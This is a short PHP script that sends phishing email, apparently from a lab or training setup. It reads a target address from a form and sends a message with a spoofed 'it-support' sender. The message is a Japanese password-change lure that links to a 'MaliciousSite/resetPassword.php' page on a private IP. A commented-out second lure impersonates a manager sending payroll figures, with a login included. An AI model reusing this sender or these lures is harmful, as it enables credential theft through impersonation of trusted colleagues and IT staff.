<?php

	$sendto = $_POST['txt-sendto'];
    print("The Malicious Mail will be Sent to MailAddress：$sendto<br />");

	//言語設定、内部エンコーディングを指定する
	mb_language("japanese");
	mb_internal_encoding("UTF-8");

	//日本語メール送信
	$to = "syunsuke.kaneko.ns@d.mbsd.jp";
	//$subject = "【最終確認願い】 全社員12月給与・賞与額のご連絡";
	//$body = "神吉社長 Cc:部長職各位\nお疲れ様です。鳥島です。\n\n全社員分の2016年12月給与・賞与額が仮確定したしましたので、下記リンクから最終確認をお願いいたします。\n（ID/PASS ： mbsd-admin/tfR468hxZp ）\n\nhttp://192.168.121.128/MaliciousSite/resetPassword.php";
	//$from = "y.torishima@mbsd.jp";
 
	$subject = "【ITより】定期的なパスワード変更のお願い";
	$body = "各位\n\nお疲れ様です。\n\n今月はパスワード変更月間です。\n定期的なパスワード変更にご協力をお願いいたします。\n\nなお、今回からグループウェア上からパスワードの変更を行うことができるようになりました。\n下記URLからパスワード変更ページを表示してください。\n\nｈttp://192.168.121.128/MaliciousSite/resetPassword.php";
	$from = "it-support@d.mbsd.jp";
	mb_send_mail($sendto,$subject,$body,"From:".$from);

	print("Complete.");

?>



